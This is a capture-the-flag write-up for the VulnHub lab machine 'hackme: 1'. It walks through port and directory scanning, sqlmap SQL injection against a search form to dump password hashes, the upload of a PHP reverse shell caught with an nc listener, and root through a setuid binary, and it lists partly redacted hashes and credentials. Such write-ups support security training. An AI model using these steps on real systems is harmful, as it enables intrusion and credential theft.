[VulnHub] hackme: 1
===============
date: 27/Sep/2019
summary: This is a writeup for VulnHub machine hackme: 1.
tags: vulnhub, writeup

## Overview
This is a writeup for VulnHub VM [hackme: 1](https://www.vulnhub.com/entry/hackme-1,330/). Here are stats for this machine from [machinescli](https://github.com/7h3rAm/machinescli):

![writeup.overview.machinescli](/static/files/posts_vulnhub_hackme/machinescli.png.webp)

### Killchain
Here's the killchain (`enumeration` → `exploitation` → `privilege escalation`) for this machine:

![writeup.overview.killchain](/static/files/posts_vulnhub_hackme/killchain.png.webp)

### TTPs
1\. `80/tcp/http/Apache httpd 2.4.34 ((Ubuntu))`: [exploit_php_fileupload](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [exploit_php_reverseshell](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [privesc_setuid](https://github.com/7h3rAm/writeups#privesc_setuid)  

## Phase #1: Enumeration
1\. Here's the Nmap scan result:  
```
# Nmap 7.70 scan initiated Fri Sep 27 12:01:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.hackme/results/192.168.92.180/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.hackme/results/192.168.92.180/scans/xml/_quick_tcp_nmap.xml 192.168.92.180
Nmap scan report for 192.168.92.180
Host is up, received arp-response (0.0022s latency).
Scanned at 2019-09-27 12:01:03 PDT for 11s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0KQXcUd/+zfBtJFhP+25xVD0f+ujGrlKTw/Ho8wy41nYgrtyHiiscKmJUv7XKAfjC8YImead1E+okzuRvpT1HX3l1xMwfWboty0V3IezTFxYIpUPmqejoC9uSsKxpd5h+vDRwchjCQGZpumuei5QT+OyY7XpdUB3P/lica+QEO2Af4ZFmeOOizRYvabosnbg2rGObbkTbMZVcGdL67ECncSRP5mcjH2cnXqAAiDEs+F9YtR0oRVX8+SqaVXLqrNzIeZxqH8BW1f0O4SPq5tsHiYbCco4yb9iMgnX1EPd981wt40+6D0N3BB1QYciv6RAS4fKCP+Akk2c4tThBGm7t
|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKTgFkEMmekHRtPsKN9f6w7/m1ih/8MraIwM4yIy5/hRW8ct1Ghc6YnhhI0KJGYF6KYiCgyKK97mVEpBVf98O5w=
|   256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPPEwLR2lULYITB1F789nQ/INIXH6NhMCHK25Z3pJquX
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.34 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 00:0C:29:49:EA:B5 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 27 12:01:14 2019 -- 1 IP address (1 host up) scanned in 12.51 seconds
```

2\. Here a summary of open ports and associated [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan files:

![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_hackme/openports.png.webp)  

3\. We find quite a few interesting links from the `gobuster` scan and open the `http://192.168.92.180:80/index.php` page to explore the web application further:  
```
gobuster -u http://192.168.92.180:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp"
  http://192.168.92.180:80/config.php (Status: 200) [Size: 0]
  http://192.168.92.180:80/index.php (Status: 200) [Size: 100]
  http://192.168.92.180:80/index.php (Status: 200) [Size: 100]
  http://192.168.92.180:80/login.php (Status: 200) [Size: 1245]
  http://192.168.92.180:80/logout.php (Status: 302)
  http://192.168.92.180:80/register.php (Status: 200) [Size: 1937]
  http://192.168.92.180:80/server-status (Status: 403) [Size: 302]
  http://192.168.92.180:80/uploads (Status: 301)
  http://192.168.92.180:80/welcome.php (Status: 302)
```

4\. We are redirected to the `http://192.168.92.180:80/login.php` link at every page visit so we try some common credentials and SQLi attempts. When these do not help, we decide to use the registration option which takes us to the `http://192.168.92.180:80/register.php` page. We register a username `foobar` with `foobar` password and get logged in to the web application:  

![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_hackme/screenshot01.png.webp)  

![writeup.enumeration.steps.4.2](/static/files/posts_vulnhub_hackme/screenshot02.png.webp)  

![writeup.enumeration.steps.4.3](/static/files/posts_vulnhub_hackme/screenshot03.png.webp)  

### Findings
#### Open Ports
```
22/tcp  |  ssh   |  OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  |  http  |  Apache httpd 2.4.34 ((Ubuntu))
```

## Phase #2: Exploitation
1\. The web application presents an online book catalog with a search box. We run `sqlmap` on this page and find the search function vulnerable to SQLi. We dump contents of `webapphacking` database and find MD5 hashed passwords within `users` table. Most of these passwords are easily cracked but we had to use an online MD5 cracker for the password hash of user `superadmin`:  
```
cat searchform.txt
  POST /welcome.php HTTP/1.1
  Host: 192.168.92.180
  User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: http://192.168.92.180/welcome.php
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 11
  Cookie: PHPSESSID=a9nbe6ikh8ugo269h3rckltqp1
  DNT: 1
  Connection: close
  Upgrade-Insecure-Requests: 1
  
  search=test
sqlmap -r searchform.txt --dbs --batch
sqlmap -r searchform.txt -D webapphacking --dump-all --batch
```

![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_hackme/screenshot04.png.webp)  

![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_hackme/screenshot05.png.webp)  

![writeup.exploitation.steps.1.3](/static/files/posts_vulnhub_hackme/screenshot06.png.webp)  

![writeup.exploitation.steps.1.4](/static/files/posts_vulnhub_hackme/screenshot07.png.webp)  

![writeup.exploitation.steps.1.5](/static/files/posts_vulnhub_hackme/screenshot08.png.webp)  

![writeup.exploitation.steps.1.6](/static/files/posts_vulnhub_hackme/screenshot09.png.webp)  

2\. We log in to the web application as user `superadmin` and are presented with file upload functionality. We create a PHP reverse shell file and upload it successfully. There was no need to bypass any kind of upload filters in this case. The location for uploaded files is already known to be `192.168.92.180/uploads/` directory from the `gobuster` scan. We find our uploaded file within this directory and proceeded to get the initial shell:  
```
nc -nlvp 443
192.168.92.180/uploads/rs.php
```

![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_hackme/screenshot10.png.webp)  

![writeup.exploitation.steps.2.2](/static/files/posts_vulnhub_hackme/screenshot11.png.webp)  

![writeup.exploitation.steps.2.3](/static/files/posts_vulnhub_hackme/screenshot12.png.webp)  

![writeup.exploitation.steps.2.4](/static/files/posts_vulnhub_hackme/screenshot13.png.webp)  

## Phase #2.5: Post Exploitation
```
www-data@hackme> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@hackme>  
www-data@hackme> uname
Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
www-data@hackme>  
www-data@hackme> ifconfig
ens33:  flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.92.180  netmask 255.255.255.0  broadcast 192.168.92.255
        inet6 fe80::20c:29ff:fe49:eab5  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:49:ea:b5  txqueuelen 1000  (Ethernet)
        RX packets 486204  bytes 304231697 (304.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 315253  bytes 40538335 (40.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
www-data@hackme>  
www-data@hackme> users
root
hackme
```

## Phase #3: Privilege Escalation
1\. We start with usuals and explore `crontab` and `sudo` permissions. Next is searching for `setuid` files. We find an interesting file `/home/legacy/touchmenot`:  
```
find / -type f -perm -04000 2>/dev/null
  /home/legacy/touchmenot
```

![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_hackme/screenshot14.png.webp)  

![writeup.privesc.steps.1.2](/static/files/posts_vulnhub_hackme/screenshot15.png.webp)  

2\. We locate this file and check it's permissions manually. We then procced to execute this file and get elevated access:  
```
ls -la /home/legacy/touchmenot
file /home/legacy/touchmenot
/home/legacy/touchmenot
```

![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_hackme/screenshot16.png.webp)  

## Loot
### Hashes
```
hackme:$6$.L285vCy$Hma4mKjGV.sE7ZCFVj2iOkRokX1u3F5DMiTPQFoZPJnQ1kUXLje/bY2BIUQFbYu.8M6BvLML5fAftZOCE........................
```
### Credentials
```
webapp: user1/he..., user2/comma..., user3/p@ssw..., test/testt..., superadmin/Uncrac....., test1/testt...
```

## References
* <https://www.vulnhub.com/entry/hackme-1,330/>  
* <https://www.hackingarticles.in/hackme-1-vulnhub-walkthrough/>  
